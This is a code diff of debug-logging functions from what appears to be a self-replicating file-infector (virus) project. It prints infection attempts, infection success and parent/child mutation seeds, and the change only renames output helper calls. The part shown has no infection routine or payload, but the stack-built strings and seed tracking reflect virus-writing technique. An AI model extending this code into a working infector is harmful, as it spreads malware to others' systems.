@@ -19,16 +19,16 @@ void	log_try_infecting(const char *file)
 {
 	PD_ARRAY(char, trying,'\033','[','3','6','m','[','L','O','G',']',' ','t','r','y','i','n','g',' ','t','o',' ','i','n','f','e','c','t',':',' ','\033','[','0','m',0);
 
-	ft_putstr(trying);
-	ft_putstr(file);
-	ft_putchar('\n');
+	putstr(trying);
+	putstr(file);
+	putchar('\n');
 }
 
 void	log_success(void)
 {
 	PD_ARRAY(char, success,'\033','[','3','2','m','[','L','O','G',']',' ','i','n','f','e','c','t','i','o','n',' ','s','u','c','c','e','e','d','e','d','\033','[','0','m','\n',0);
 
-	ft_putstr(success);
+	putstr(success);
 }
 
 void	log_old_father_seeds(const uint64_t father_seed[2])
@@ -36,10 +36,10 @@ void	log_old_father_seeds(const uint64_t father_seed[2])
 	PD_ARRAY(char, original,'[','L','O','G',']',' ','o','r','i','g','i','n','a','l',':',' ',' ',' ',' ',0);
 	PD_ARRAY(char, semicolon, ';',0);
 
-	ft_putstr(original);
-	ft_putu64(father_seed[0]);
-	ft_putstr(semicolon);
-	ft_putu64(father_seed[1]);
+	putstr(original);
+	putu64(father_seed[0]);
+	putstr(semicolon);
+	putu64(father_seed[1]);
 }
 
 void	log_all_seeds(const uint64_t father_seed[2], const uint64_t son_seed[2], uint64_t client_id, uint64_t unique_seed)
@@ -53,24 +53,24 @@ void	log_all_seeds(const uint64_t father_seed[2], const uint64_t son_seed[2], ui
 	PD_ARRAY(char, opxor,' ','^',' ',0);
 
 
-	ft_putstr(newline);
-	ft_putstr(father);
-	ft_putu64(father_seed[0]);
-	ft_putstr(semicolon);
-	ft_putu64(father_seed[1]);
-	ft_putstr(newline);
-	ft_putstr(son);
-	ft_putu64(son_seed[0]);
-	ft_putstr(semicolon);
-	ft_putu64(son_seed[1]);
-	ft_putstr(newline);
-	ft_putstr(uniquemethod);
-	ft_putu64(unique_seed);
-	ft_putstr(equal);
-	ft_putu64(son_seed[0]);
-	ft_putstr(opxor);
-	ft_putu64(client_id);
-	ft_putstr(newline);
+	putstr(newline);
+	putstr(father);
+	putu64(father_seed[0]);
+	putstr(semicolon);
+	putu64(father_seed[1]);
+	putstr(newline);
+	putstr(son);
+	putu64(son_seed[0]);
+	putstr(semicolon);
+	putu64(son_seed[1]);
+	putstr(newline);
+	putstr(uniquemethod);
+	putu64(unique_seed);
+	putstr(equal);
+	putu64(son_seed[0]);
+	putstr(opxor);
+	putu64(client_id);
+	putstr(newline);
 }
 
 #endif
